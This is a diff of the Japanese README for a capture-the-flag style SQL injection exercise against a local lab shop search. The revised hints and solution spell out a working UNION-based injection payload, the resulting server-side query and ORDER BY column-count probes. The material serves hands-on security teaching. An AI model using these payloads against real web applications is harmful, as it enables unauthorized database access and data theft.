@@ -1,6 +1,7 @@
 # 02 - UNION-based Search
 
 `http://localhost:3002` の商品検索から、DB内のflagを抜き出せ。
+`server.py`のソースコードは読んでよい。
 
 このDBのテーブル構成:
 - `products(id, name, description, price)` — 検索対象、4カラム
@@ -10,33 +11,49 @@
 
 <details><summary>ヒント1</summary>
 
-`?q=`の値をそのままLIKE句に埋め込んでいる(`server.py`参照)。エラーはそのままJSONで返る。
+`server.py`の`/search`エンドポイントを見ろ。`?q=`の値はどう組み込まれている?
 
 </details>
 
 <details><summary>ヒント2</summary>
 
-まず`'`(シングルクォート)1つだけ送ってみろ。SQL構文エラーが返るはずだ。クォートを閉じずに
-残りの構文を自分で足せる状態になっている。
+`q`は`LIKE '%...%'`の中にそのまま埋め込まれる。試しに`q`に`'`(シングルクォート)を1つだけ
+送ってみろ。SQL構文エラーが返るはずだ → クォートを自分で閉じて、続きに好きなSQLを足せる
+状態になっている。
 
 </details>
 
 <details><summary>ヒント3</summary>
 
-`products`は4カラムなので、`UNION SELECT`も4つの値を返す必要がある。型が違うカラムには
-`NULL`を入れれば型エラーを回避できる(例: `UNION SELECT 1,'a','b',1`)。
+`products`は4カラムなので、混ぜ込む`UNION SELECT`も4つの値を返す必要がある。型が違う
+カラムには`NULL`を入れれば型エラーを回避できる(例: `UNION SELECT 1,'a','b',1`で試して
+エラーが出ないか確認する)。
 
 </details>
 
 <details><summary>解答</summary>
 
+送るpayload(`q`パラメータ):
 ```
-q=zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -
+zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -
 ```
 
-`zzz`で本来の検索を空振りさせ、`UNION SELECT`で`flags`テーブルの値を同じ4カラムの形で
-結果に混ぜ込んでいる。`id,flag`は`products`の`id,name`と型が合うのでそのまま、残り2つは
-`NULL`で埋めている。
+これによりサーバー側で組み立てられる実際のSQLはこうなる:
+```sql
+SELECT id, name, description, price FROM products
+WHERE name LIKE '%zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -%'
+```
+
+分解すると:
+- `zzz` — 本来の検索語。適当な値でよく、存在しない商品名なので本来の検索結果は0件になる
+- `' `— LIKE句のクォートを閉じる
+- `UNION SELECT id,flag,NULL,NULL FROM flags` — `flags`テーブルの行を、`products`と同じ
+  4カラムの形(id, name, description, price)に変形して結果に追加する。`id,flag`は型が
+  合うのでそのまま、残り2カラムは`NULL`で埋める
+- `-- -` — `--`はMySQLのコメント開始(直後に半角スペース必須)。これで末尾に残る`%'`を
+  無効化している
+
+結果、検索結果に`flags`テーブルの行が紛れ込み、`name`カラムの位置にflagが表示される。
 
 ### もっと自力で探したい場合
 
@@ -45,6 +62,6 @@ q=zzz' UNION SELECT id,flag,NULL,NULL FROM flags-- -
 q=zzz' ORDER BY 4-- -   -> 通る
 q=zzz' ORDER BY 5-- -   -> エラー(5カラム目は存在しない)
 ```
-これでSELECT対象のカラム数を特定できる。
+エラーになる手前の数字がSELECT対象のカラム数。
 
 </details>
